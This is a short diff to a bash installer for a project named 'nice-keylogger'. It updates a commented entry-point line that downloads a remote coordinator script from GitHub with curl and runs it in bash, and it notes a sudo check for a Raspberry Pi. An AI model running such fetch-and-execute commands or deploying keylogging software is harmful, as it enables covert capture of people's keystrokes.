@@ -1,8 +1,8 @@
 #!/bin/bash
 # application to install, setup, and run the keylogger.
 
-# entry point: TODO correct this url to be the main branch
-# /bin/bash -c "$(curl -faSL https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator-test/src/test.sh)"
+# entry point:
+# /bin/bash -c "$(curl -faSL https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/coordinator.sh)"
 
 # CHECK THAT USER CAN ISSUE SUDO
 # Totally expects the root user to be an unchanged Raspberry Pi
